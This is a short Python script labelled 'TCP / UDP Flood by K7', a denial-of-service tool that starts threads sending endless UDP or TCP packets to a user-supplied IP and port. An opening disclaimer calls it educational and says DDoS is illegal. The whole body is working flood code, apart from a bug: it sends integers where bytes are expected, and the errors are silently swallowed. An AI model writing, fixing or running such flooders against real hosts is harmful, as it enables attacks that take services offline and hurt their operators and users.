# DISCLAIMER

# This programme is for education only, Is for learn how to make TCP/UDP Flood. DDoS are illegal, If you wan't test this program, test on your server infrastructure.

import argparse as args
import socket as sock
import random as rdm
import threading as thread

ap = args.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

print('TCP / UDP Flood by K7')

ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def udpRun():
    d = rdm.randint(0, 1024)
    i = rdm.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(d, addr)
            print(i+" - UDP Hit")
        except:
            print('Target not hit, error')

def tcpRun():
    d =  rdm.randint(0, 16)
    i = rdm.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
            s.connect((ip, port))
            s.send(d)
            for x in range(times):
                s.send(d)
            print(i+" - TCP Hit")
        except:
            print('Target not hit, error')

for y in range(threads):
    if choice == "y":
        th = thread.Thread(target=udpRun)
        th.start()
    else:
        th = thread.Thread(target=tcpRun)
        th.start()